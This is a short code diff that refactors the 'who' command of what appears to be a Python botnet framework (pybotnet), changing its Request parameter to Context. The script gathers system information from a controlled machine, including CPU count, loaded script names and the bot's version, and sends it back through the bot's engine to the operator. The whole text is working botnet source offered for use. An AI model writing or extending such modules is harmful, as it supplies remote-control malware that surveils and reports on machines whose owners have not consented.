@@ -1,8 +1,8 @@
-from .. import BotNet, Request
+from .. import BotNet, Context
 
 
 @BotNet.default_script(script_version="0.0.1")
-def who(request: Request) -> str:
+def who(context: Context) -> str:
     """return system info
     example command: `/who` \n
     return:
@@ -18,12 +18,12 @@ def who(request: Request) -> str:
     * cpu_count
     * pybotnet_version
     
-    (cache for 30 seconds)
+    (context.system_info(): cache for 30 seconds)
     """
 
     info = ""
 
-    for k, v in request.system_info().items():
+    for k, v in context.system_info().items():
         if k == "scripts_name":
             info += "scripts_name:\n"
             for scripts_name in v:
@@ -31,4 +31,4 @@ def who(request: Request) -> str:
         else:
             info += f"\n{k}: {v}"
 
-    request.engine.send(info)
+    context.engine.send(info)
